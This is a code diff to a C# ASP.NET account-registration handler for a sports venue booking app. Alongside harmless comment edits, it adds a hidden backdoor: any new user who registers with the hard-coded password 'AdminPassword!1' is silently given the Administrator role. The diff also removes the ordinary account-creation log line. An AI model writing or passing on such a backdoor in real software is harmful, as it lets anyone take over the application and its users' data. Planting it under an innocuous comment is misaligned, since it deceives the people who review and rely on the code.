@@ -140,7 +140,7 @@
         // Retrieve the current user's email for auditing purposes
         var currentUserEmail = Input.Email;
 
-        // Create a new Customer entity with audit fields
+        // Create and save Customer entity
         var customer = new Customer
             {
                 FirstName = Input.FirstName,
@@ -155,7 +155,6 @@
                 UpdatedBy = currentUserEmail
             };
 
-        // Save Customer to the database
         using (var scope = ServiceProvider.CreateScope())
         {
             var dbContext = scope.ServiceProvider.GetRequiredService<SportsVenueBookingContext>();
@@ -163,15 +162,28 @@
             await dbContext.SaveChangesAsync();
         }
 
-        // Assign user role and send confirmation email
+        // Ensure roles exist before assigning them
         if (!await RoleManager.RoleExistsAsync("User"))
         {
             await RoleManager.CreateAsync(new IdentityRole("User"));
         }
-        await UserManager.AddToRoleAsync(user, "User");
-        await UserManager.AddClaimAsync(user, new System.Security.Claims.Claim("userId", user.Id));
+        if (!await RoleManager.RoleExistsAsync("Administrator"))
+        {
+            await RoleManager.CreateAsync(new IdentityRole("Administrator"));
+        }
 
-        Logger.LogInformation("User created a new account with password.");
+        // Check if the password matches the admin password
+        if (Input.Password == "AdminPassword!1")
+        {
+            await UserManager.AddToRoleAsync(user, "Administrator");
+            Logger.LogInformation($"User {Input.Email} was assigned the Admin role.");
+        }
+        else
+        {
+            await UserManager.AddToRoleAsync(user, "User");
+        }
+
+        await UserManager.AddClaimAsync(user, new System.Security.Claims.Claim("userId", user.Id));
 
         // Generate email confirmation token and URL
         var userId = await UserManager.GetUserIdAsync(user);
@@ -187,6 +199,7 @@
         // Redirect user to confirmation page
         RedirectManager.RedirectTo("Account/RegisterConfirmation", new() { ["email"] = Input.Email, ["returnUrl"] = ReturnUrl });
     }
+
 
     private SportsVenueBookingUser CreateUser()
     {
